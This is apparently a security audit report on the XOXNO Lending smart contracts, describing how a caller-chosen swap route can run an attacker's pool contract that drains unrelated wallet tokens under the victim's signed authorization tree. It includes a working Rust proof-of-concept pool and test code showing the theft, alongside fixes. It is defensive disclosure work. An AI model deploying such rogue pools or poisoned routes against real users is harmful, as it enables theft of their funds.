### Title
Route-selected contracts can spend unrelated caller wallet tokens under the strategy authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary
XOXNO Lending confines the router to one exact controller-token transfer, but it executes caller-supplied route code while the caller’s root authorization for the strategy remains active. [1](#0-0)  A malicious pool selected by opaque `swap` bytes can invoke `token.transfer(caller, attacker, amount)` on an unrelated token; if the caller signs the authorization tree returned by simulation, that child transfer is authorized even though the swap accounting and final account risk remain valid. [2](#0-1) 

### Finding Description
`swap_collateral` accepts attacker-influenced `swap: Bytes`, authenticates `caller`, verifies account ownership, and reaches `withdraw_and_swap_from_supply`. [3](#0-2) [4](#0-3) 

`swap_tokens` scopes only the controller’s intended input transfer to the configured router, then invokes `execute_strategy(controller, amount_in, swap)`. [5](#0-4)  Afterward it verifies only that controller input did not overspend and that controller received positive output; it has no visibility into unrelated token transfers performed by contracts below the router. [6](#0-5) 

The authorization boundary is therefore narrower than the code executed under it. The test double records a route-hop transfer from the caller to an attacker as a child of the caller’s `swap_collateral` authorization and shows that signing that recorded tree allows the transfer. [7](#0-6) [2](#0-1) 

The same boundary applies to `multiply`, `swap_debt`, and `repay_debt_with_collateral`, which also pass caller-selected route bytes into `swap_tokens` or `swap_tokens_or_passthrough`. [8](#0-7) [9](#0-8) [10](#0-9) 

### Impact Explanation
A successful route can steal tokens held in the caller’s wallet that are unrelated to the lending position and were never supplied, borrowed, or declared as route input. [11](#0-10)  The malicious hop can still deliver the expected output, so `swap_collateral` completes and deposits a valid position while the unrelated wallet-token transfer remains part of the committed transaction. [12](#0-11) 

### Likelihood Explanation
An unprivileged attacker can deploy the malicious hop contract and supply the poisoned route through the normal route-generation path; the only additional requirement is that the victim signs the authorization tree produced by simulation. [13](#0-12)  The route is an opaque byte payload to the controller, while the unauthorized transfer appears only as an authorization child rather than as an obvious strategy argument. [14](#0-13) 

### Recommendation
Do not execute route-selected contracts beneath a caller-authorized strategy unless every external hop target is constrained to a protocol-approved venue registry. [15](#0-14)  The router boundary should expose a route manifest that the controller can validate, or the configured router must enforce the pool allowlist before invocation. [16](#0-15)  Clients should additionally reject any authorization tree containing calls other than the expected controller-root and exact input transfer. [17](#0-16) 

### Proof of Concept
The harness route constructs a caller-selected hop pool and has that pool call `transfer(victim, attacker, amount)` on an unrelated wallet token while returning enough output for the strategy to pass. [18](#0-17) 

```rust
// From tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs
pub fn swap(env: Env) {
    let (victim, wallet_token, to, amount): (Address, Address, Address, i128) =
        env.storage().instance().get(&symbol_short!("PLAN")).unwrap();
    if amount > 0 {
        token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
    }
}
```

The recorded authorization places that transfer under the victim’s `swap_collateral` root; signing the tree drains the unrelated wallet balance while the controller receives the expected output. [19](#0-18)  Without the malicious child in the signed tree, the host rejects the transfer and rolls back the strategy, confirming that the failure is authorization-scope escape rather than normal token semantics. [17](#0-16)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-23)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/lib.rs (L283-301)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/multiply.rs (L90-97)
```rust
    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/repay_debt_with_collateral.rs (L108-118)
```rust
    let debt_available = withdraw_and_swap_from_supply(
        env,
        account,
        cache,
        caller,
        collateral,
        collateral_amount,
        &debt.asset,
        swap,
        events::PositionAction::RpColWd,
    );
```

**File:** interfaces/swap-aggregator/src/lib.rs (L18-21)
```rust
#[contractclient(name = "SwapAggregatorClient")]
pub trait SwapAggregatorInterface {
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128;

```
